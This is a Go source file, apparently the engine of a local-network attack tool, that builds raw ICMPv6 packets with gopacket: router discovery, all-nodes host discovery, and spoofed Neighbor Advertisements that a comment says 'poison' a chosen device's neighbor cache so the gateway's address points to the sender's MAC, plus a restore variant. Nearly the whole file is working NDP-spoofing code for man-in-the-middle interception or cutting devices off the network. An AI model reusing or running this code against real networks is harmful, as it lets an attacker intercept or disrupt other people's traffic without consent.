package engine

import (
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
)

var (
	allNodesIP    = net.ParseIP("ff02::1")
	allNodesMAC   = net.HardwareAddr{0x33, 0x33, 0x00, 0x00, 0x00, 0x01}
	allRoutersIP  = net.ParseIP("ff02::2")
	allRoutersMAC = net.HardwareAddr{0x33, 0x33, 0x00, 0x00, 0x00, 0x02}
)

// naFlagRouter and naFlagOverride mark a Neighbor Advertisement as coming from a router and as
// authoritative, so the recipient overwrites its cached entry for the target address.
const (
	naFlagRouter   = 0x80
	naFlagOverride = 0x20
)

// linkLocalFromMAC derives the EUI-64 fe80::/64 address for a MAC. It is a fallback for our own
// link-local source when the interface does not expose one.
func linkLocalFromMAC(mac net.HardwareAddr) net.IP {
	if len(mac) != 6 {
		return nil
	}
	return net.IP{0xfe, 0x80, 0, 0, 0, 0, 0, 0, mac[0] ^ 0x02, mac[1], mac[2], 0xff, 0xfe, mac[3], mac[4], mac[5]}
}

func serializeICMPv6(eth *layers.Ethernet, ip6 *layers.IPv6, icmp *layers.ICMPv6, body gopacket.SerializableLayer) ([]byte, error) {
	if err := icmp.SetNetworkLayerForChecksum(ip6); err != nil {
		return nil, err
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	if err := gopacket.SerializeLayers(buf, opts, eth, ip6, icmp, body); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// BuildRouterSolicitation crafts an RS to the all-routers group so the real router answers with a
// Router Advertisement, which reveals its link-local address and MAC.
func BuildRouterSolicitation(srcMAC net.HardwareAddr, srcIP net.IP) ([]byte, error) {
	if len(srcMAC) != 6 {
		return nil, errBadAddr
	}
	eth := &layers.Ethernet{SrcMAC: srcMAC, DstMAC: allRoutersMAC, EthernetType: layers.EthernetTypeIPv6}
	ip6 := &layers.IPv6{Version: 6, SrcIP: srcIP, DstIP: allRoutersIP, HopLimit: 255, NextHeader: layers.IPProtocolICMPv6}
	icmp := &layers.ICMPv6{TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeRouterSolicitation, 0)}
	rs := &layers.ICMPv6RouterSolicitation{Options: layers.ICMPv6Options{{
		Type: layers.ICMPv6OptSourceAddress, Data: srcMAC,
	}}}
	return serializeICMPv6(eth, ip6, icmp, rs)
}

func BuildAllNodesEchoRequest(srcMAC net.HardwareAddr, srcIP net.IP) ([]byte, error) {
	if len(srcMAC) != 6 || srcIP == nil {
		return nil, errBadAddr
	}
	eth := &layers.Ethernet{SrcMAC: srcMAC, DstMAC: allNodesMAC, EthernetType: layers.EthernetTypeIPv6}
	ip6 := &layers.IPv6{Version: 6, SrcIP: srcIP, DstIP: allNodesIP, HopLimit: 255, NextHeader: layers.IPProtocolICMPv6}
	icmp := &layers.ICMPv6{TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeEchoRequest, 0)}
	echo := &layers.ICMPv6Echo{Identifier: 0x4c4e, SeqNumber: 1}
	return serializeICMPv6(eth, ip6, icmp, echo)
}

// BuildNeighborAdvertisement crafts an unsolicited NA telling the recipient that target (the
// gateway's link-local IPv6) lives at tlla. The Ethernet frame is unicast to dstMAC while the IPv6
// destination is the all-nodes group, so only the intended device receives it (L2 unicast) yet
// accepts it without us needing to know its address. With tlla = our MAC this poisons; with
// tlla = the gateway's real MAC it restores.
func BuildNeighborAdvertisement(srcMAC, dstMAC net.HardwareAddr, srcIP, target net.IP, tlla net.HardwareAddr) ([]byte, error) {
	if len(srcMAC) != 6 || len(dstMAC) != 6 || len(tlla) != 6 {
		return nil, errBadAddr
	}
	eth := &layers.Ethernet{SrcMAC: srcMAC, DstMAC: dstMAC, EthernetType: layers.EthernetTypeIPv6}
	ip6 := &layers.IPv6{Version: 6, SrcIP: srcIP, DstIP: allNodesIP, HopLimit: 255, NextHeader: layers.IPProtocolICMPv6}
	icmp := &layers.ICMPv6{TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeNeighborAdvertisement, 0)}
	na := &layers.ICMPv6NeighborAdvertisement{
		Flags:         naFlagRouter | naFlagOverride,
		TargetAddress: target,
		Options:       layers.ICMPv6Options{{Type: layers.ICMPv6OptTargetAddress, Data: tlla}},
	}
	return serializeICMPv6(eth, ip6, icmp, na)
}
